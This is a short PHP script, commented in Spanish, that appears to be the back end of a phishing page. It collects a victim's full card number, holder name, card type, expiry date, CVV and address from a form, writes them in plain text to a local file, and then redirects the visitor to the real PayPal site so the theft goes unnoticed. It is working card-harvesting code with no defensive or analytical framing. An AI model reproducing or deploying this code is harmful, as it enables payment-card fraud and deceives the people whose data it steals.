<?php
// Abrir el archivo para escritura en modo append
$archivo = fopen("datos.txt", "a");

// Obtener los datos del formulario y sanitizarlos
$numero = isset($_POST['numero']) ? trim($_POST['numero']) : '';
$titular = isset($_POST['titular']) ? trim($_POST['titular']) : '';
$tipo = isset($_POST['tipo']) ? trim($_POST['tipo']) : '';
$exp = isset($_POST['exp']) ? trim($_POST['exp']) : '';
$cvv = isset($_POST['cvv']) ? trim($_POST['cvv']) : '';
$direccion = isset($_POST['direccion']) ? trim($_POST['direccion']) : '';

// Escribir los datos en el archivo
fwrite($archivo, "Tarjeta: $numero | Titular: $titular | Tipo: $tipo | Vencimiento: $exp | CVV: $cvv | Dirección: $direccion" . PHP_EOL);

// Cerrar el archivo
fclose($archivo);

// Redirigir a PayPal (o a otra página según necesidad)
header("Location: https://www.paypal.com");
exit;
?>
